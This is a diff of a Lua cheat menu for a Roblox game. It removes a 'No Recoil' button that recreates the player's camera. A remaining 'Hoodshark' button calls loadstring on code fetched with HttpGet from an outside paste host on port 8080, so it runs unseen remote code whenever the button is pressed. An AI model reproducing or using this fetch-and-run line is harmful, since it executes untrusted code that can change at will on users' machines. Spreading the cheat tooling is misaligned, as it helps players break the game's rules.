@@ -3496,25 +3496,6 @@ Tab:AddButton({
         )
         
         CombatTab:Button(
-            "No Recoil",
-            function()
-                local player = game.Players.LocalPlayer
-                for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
-                    if v:IsA('Camera') then
-                        v:Destroy()
-                    end
-                end
-                local newcam = Instance.new('Camera')
-                newcam.Parent = game:GetService('Workspace')
-                newcam.Name = 'Camera'
-                newcam.CameraType = 'Custom'
-                newcam.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
-                newcam.HeadLocked = true
-                newcam.HeadScale = 1 
-            end
-        )
-        
-        CombatTab:Button(
             "Hoodshark",
             function() 
                 loadstring(game:HttpGet('http://bin.shortbin.eu:8080/raw/n2dTcDByxD'))()
